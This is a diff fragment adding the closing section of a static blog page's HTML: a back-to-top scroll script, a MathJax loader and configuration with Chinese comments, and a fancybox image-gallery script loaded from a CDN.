+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
